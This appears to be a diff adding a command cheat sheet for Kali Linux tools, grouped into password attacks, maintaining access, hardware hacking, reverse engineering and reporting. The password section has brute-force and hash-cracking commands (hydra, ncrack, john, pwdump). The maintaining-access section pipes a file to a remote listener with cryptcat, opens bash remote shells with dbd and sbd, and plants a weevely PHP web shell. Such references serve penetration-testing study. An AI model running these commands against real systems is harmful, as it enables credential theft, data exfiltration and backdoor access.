+	root@kali:~# pwdump
+	root@kali:~# pwdump system sam
+	root@kali:~# lsadump system security
+	root@kali:~# crunch
+	root@kali:~# crunch 6 6 0123456789abcdef -o 6chars.txt
+	root@kali:~# dbpwaudit
+	root@kali:~# dbpwaudit -s 192.168.1.130 -d testdb -D MySQL -U root -P /usr/share/wordlists/nmap.lst
+	root@kali:~# findmyhash
+	root@kali:~# findmyhash MD5 -h 098f6bcd4621d373cade4e832627b4f6
+	root@kali:~# gpp-decrypt
+	root@kali:~# gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
+	root@kali:~# hash-identifier 
+	root@kali:~# hexorbase
+	root@kali:~# hydra -h
+	root@kali:~# pw-inspector
+	root@kali:~# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
+	root@kali:~# pw-inspector -i /usr/share/wordlists/nmap.lst -o /root/passes.txt -m 6 -M 10
+	root@kali:~# mailer
+	root@kali:~# john
+	root@kali:~# unafs
+	root@kali:~# unshadow
+	root@kali:~# unique
+	root@kali:~# unshadow passwd shadow > unshadowed.txt
+	root@kali:~# john --wordlist=/usr/share/john/password.lst --rules unshadowed.txt 
+	root@kali:~# unique -v -inp=allwords.txt uniques.txt
+	root@kali:~# johnny
+	root@kali:~# keimpx -h
+	root@kali:~# keimpx -l /root/smbopen.txt -U victim -P s3cr3t -v 1 -b
+	root@kali:~# cat /opt/Teeth/README.txt 
+	root@kali:~# maskprocessor -h
+	root@kali:~# maskprocessor pass?d?l
+	root@kali:~# ncrack -h
+	root@kali:~# ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1
+	root@kali:~# statsgen -h
+	root@kali:~# maskgen -h
+	root@kali:~# policygen -h
+	root@kali:~# statsgen --minlength=10 --maxlength=10 rockyou.txt 
+	root@kali:~# policygen --length=8 --minupper 1 --mindigit 1 -o complexity.hcmask
+	root@kali:~# patator
+	root@kali:~# patator mysql_login user=root password=FILE0 0=/root/passes.txt host=127.0.0.1 -x ignore:fgrep='Access denied for user'
+	root@kali:~# pd -h
+	root@kali:~# pd ssh -d passes.txt -t 192.168.1.202 -v
+	root@kali:~# polenum
+	root@kali:~# polenum victim:s3cr3t@192.168.1.200 '445/SMB'
+	root@kali:~# rcrack
+	root@kali:~# rt2rtc
+	root@kali:~# rtc2rt
+	root@kali:~# rtgen
+	root@kali:~# rtsort
+	root@kali:~# rcracki_mt
+	root@kali:~# rcracki_mt -h 5d41402abc4b2a76b9719d911017c592 -t 4 tables2/md5/
+	root@kali:~# rsmangler -h
+	root@kali:~# cat words.txt | rsmangler -m 6 -x 8 --file - > mangled.txt
+	root@kali:~# wc -l mangled.txt 
+	root@kali:~# wc -l words.txt 
+	root@kali:~# sqldict
+	root@kali:~# statsprocessor --help
+	root@kali:~#  statsprocessor --pw-min=6 --pw-max=8 /usr/share/oclhashcat/hashcat.hcstat
+	root@kali:~# thc-pptp-bruter
+	root@kali:~# truecrack --help
+	root@kali:~# truecrack -t truecrypt_vol -k ripemd160 -w passes.txt 
+	root@kali:~# webscarab
+	root@kali:~# zaproxy
+}
+	
+Maintaining Access
+------------------
+{
+	root@kali:~# cryptcat -h
+	root@kali:~# cryptcat -l -p 4444 -n > dataxfer
+	root@kali:~# cryptcat 192.168.1.202 4444 < /tmp/juicyinfo
+	root@kali:~# bgrep
+	root@kali:~# cymothoa -h
+	root@kali:~# udp_server
+	root@kali:~# dbd -h
+	root@kali:~# dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080
+	root@kali:~# dbd -l -p8080 -v
+	root@kali:~# dns2tcpd
+	root@kali-server:~# cat >>.dns2tcpdrc <<END
+	root@kali-client:~# cat >>.dns2tcprc <<END
+	dns2tcp.kali.org. IN NS lab.kali.org.
+	root@kali:~# httptunnel_server -h
+	root@kali:~# httptunnel_client -h
+	root@kali:~# nano /usr/share/http-tunnel/perl/httptunnel_server.cfg
+	root@kali:~# httptunnel_server
+	root@kali:~# nano /usr/share/http-tunnel/perl/httptunnel_client.cfg 
+	root@kali:~# httptunnel_client
+	root@kali:~# hts -h
+	root@kali:~# htc -h
+	root@kali-srv:~# hts -F localhost:22 2139
+	root@kali-clt:~# htc -F 8090 192.168.1.15:2139
+	root@kali-clt:~# ssh localhost -p 8090
+	root@kali:~# intersect 
+	root@kali:~# ls -l /usr/share/nishang/
+	root@kali:~# polenum
+	root@kali:~# polenum victim:s3cr3t@192.168.1.200 '445/SMB'
+	root@kali:~# ls -l /usr/share/powersploit/
+	root@kali:~# pwnat -h
+	root@kali:~# pwnat -s 8080
+	root@kali:~# pwnat -c 8000 192.168.1.202 8080 google.com 80
+	root@kali:~# ridenum
+	root@kali:~# ridenum 192.168.1.236 500 50000 /tmp/passes.txt
+	root@kali:~# sbd -h
+	root@kali:~# sbd -l -p 4444 -e bash -v -n
+	root@kali:~# sbd 192.168.1.202 4444
+	root@kali:~# u3-pwn 
+	root@kali:~# ls -l /usr/share/webshells/
+	root@kali:~# weevely help
+	root@kali:~# weevely generate s3cr3t
+	root@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t
+	root@kali:~# winexe --help
+	root@kali:~# winexe -U 'Administrator%s3cr3t' //192.168.1.225 'cmd.exe /c echo "this is running on windows"' "this is running on windows"
+}
+
+
+
+Hardware Hacking
+----------------
+{
+	root@kali:~# android
+	root@kali:~# apktool
+	root@kali:~# apktool d /root/SdkControllerApp.apk 
+	root@kali:~# arduino
+	root@kali:~# d2j-jar2dex -h
+	root@kali:~# d2j-jar-remap -h
+	root@kali:~# d2j-dex2jar -h
+	root@kali:~# dex2jar
+	root@kali:~# d2j-jasmin2jar -h
+	root@kali:~# d2j-jar-access -h
+	root@kali:~# d2j-asm-verify -h
+	root@kali:~# d2j-dex-dump -h
+	root@kali:~# d2j-init-deobf -h
+	root@kali:~# d2j-apk-sign -h
+	root@kali:~# d2j-jar2jasmin -h
+	root@kali:~# d2j-dex2jar /usr/share/metasploit-framework/data/android/apk/classes.dex dex2jar /usr/share/metasploit-framework/data/android/apk/classes.dex -> classes-dex2jar.jar
+	root@kali:~# sakis3g help
+	root@kali:~# sakis3g --interactive "connect"
+	root@kali:~# smali --help
+	root@kali:~# baksmali --help
+}
+	
+	
+Reverse Engineering
+-------------------
+{
+	root@kali:~# apktool
+	root@kali:~# apktool d /root/SdkControllerApp.apk 
+	root@kali:~# d2j-jar2dex -h
+	root@kali:~# d2j-jar-remap -h
+	root@kali:~# d2j-dex2jar -h
+	root@kali:~# dex2jar
+	root@kali:~# d2j-jasmin2jar -h
+	root@kali:~# d2j-jar-access -h
+	root@kali:~# d2j-asm-verify -h
+	root@kali:~# d2j-dex-dump -h
+	root@kali:~# d2j-init-deobf -h
+	root@kali:~# d2j-apk-sign -h
+	root@kali:~# d2j-jar2jasmin -h
+	root@kali:~# d2j-dex2jar /usr/share/metasploit-framework/data/android/apk/classes.dex dex2jar /usr/share/metasploit-framework/data/android/apk/classes.dex -> classes-dex2jar.jar
+	root@kali:~# python
+	root@kali:~# edb
+	root@kali:~# jad -h
+	root@kali:~# jad javaversion.class
+	root@kali:~# javasnoop
+	root@kali:~# jd-gui
+	root@kali:~# wine /usr/share/ollydbg/OLLYDBG.EXE
+	root@kali:~# smali --help
+	root@kali:~# baksmali --help
+	root@kali:~# callgrind_annotate -h
+	root@kali:~# callgrind_control -h
+	root@kali:~# cg_annotate -h
+	root@kali:~# cg_diff -h
+	root@kali:~# cg_merge
+	root@kali:~# ms_print -h
+	root@kali:~# valgrind -h
+	root@kali:~# valgrind-listener -h
+	root@kali:~# vgdb -h
+	root@kali:~# yara
+}
+
+
+	
+Reporting Tools	
+------------------
+{
+	root@kali:~# casefile
+	root@kali:~# cutycapt --help
+	root@kali:~# cutycapt --url=http://www.kali.org --out=kali.png
+	root@kali:~# unix2dos -h
+	root@kali:~# unix2mac -h
+	root@kali:~# dos2unix -h
+	root@kali:~# mac2unix -h
+	root@kali:~# unix2dos -n unix.txt dos.txt
+	root@kali:~# unix2mac -n unix.txt mac.txt
+	root@kali:~# dos2unix -n dos.txt unix2.txt
+	root@kali:~# mac2unix -n mac.txt unix3.txt
+	
+}
+	
+
+	
+
